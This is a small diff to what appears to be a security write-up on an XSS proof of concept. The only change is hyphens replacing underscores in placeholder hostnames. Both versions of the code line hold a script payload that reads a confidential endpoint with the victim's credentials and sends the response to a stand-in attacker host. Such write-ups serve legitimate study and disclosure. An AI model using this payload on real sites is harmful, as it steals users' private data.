@@ -141,7 +141,7 @@ This POC requires that the respective JS script is hosted at `attacker-controlle
 
 ```js
 <script>
-document.location = "https://trusted-subdomain.website-with-xss.com/?xss=<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://website_with_xss.com/endpoint_with_confidential_data',true); req.withCredentials = true; req.send(); function reqListener() { location='https://attacker-controller.com?key='%2bthis.responseText; };%3C/script>";
+document.location = "https://trusted-subdomain.website-with-xss.com/?xss=<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://website-with-xss.com/endpoint-with-confidential-data',true); req.withCredentials = true; req.send(); function reqListener() { location='https://attacker-controller.com?key='%2bthis.responseText; };%3C/script>";
 </script>
 ```
 
